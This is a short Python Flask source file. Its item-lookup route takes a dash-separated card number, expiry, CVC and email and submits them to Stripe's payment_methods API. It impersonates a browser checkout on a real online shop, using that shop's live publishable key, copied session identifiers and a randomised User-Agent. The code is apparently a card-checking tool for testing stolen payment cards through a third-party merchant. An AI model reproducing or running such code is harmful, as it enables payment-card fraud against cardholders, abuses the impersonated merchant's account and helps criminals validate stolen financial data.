from flask import Flask, jsonify
import requests as request
import random

app = Flask(__name__)

# Sample data (in-memory database)
items = []

# GET all items
@app.route("/", methods=["GET"])
def hello():
    return "HELLO"

# GET single item
@app.route('/api/items/<string:kitu>', methods=['GET'])
def get_item(kitu):
    nlist = kitu.split("-")
    data = f"type=card&billing_details[name]=+&billing_details[email]={nlist[4]}&card[number]={nlist[0]}&card[cvc]={nlist[3]}&card[exp_month]={nlist[1]}&card[exp_year]={nlist[2]}&guid=cb75bc5a-0e04-4bb3-98b4-60c06812b39413ee9f&muid=deb79e6a-8d5b-441d-bc20-0e8dd36ce51721118f&sid=baabf659-0dd6-40dc-b9a6-19543bba6f43914db7&pasted_fields=number&payment_user_agent=stripe.js%2F7b2f7dbc1b%3B+stripe-js-v3%2F7b2f7dbc1b%3B+split-card-element&referrer=https%3A%2F%2Fetchingsbyemma.com&time_on_page=53126&key=pk_live_51HLuMBAIFSPDp19R3JIaf1NuTgMvtVgmtDu60CDBzvvyCrS3W4Gu1OBjVF0vlUB85ahOu3fmEc7mswVedeWpLZdf00WpiTlAmG"

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,99)} (KHTML, like Gecko) Chrome/{random.randint(100,150)}.0.0.0 Safari/{random.randint(500,600)}.{random.randint(1,99)}'
        }
    res = request.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers) 
    return res.json()

if __name__ == '__main__':
    app.run()
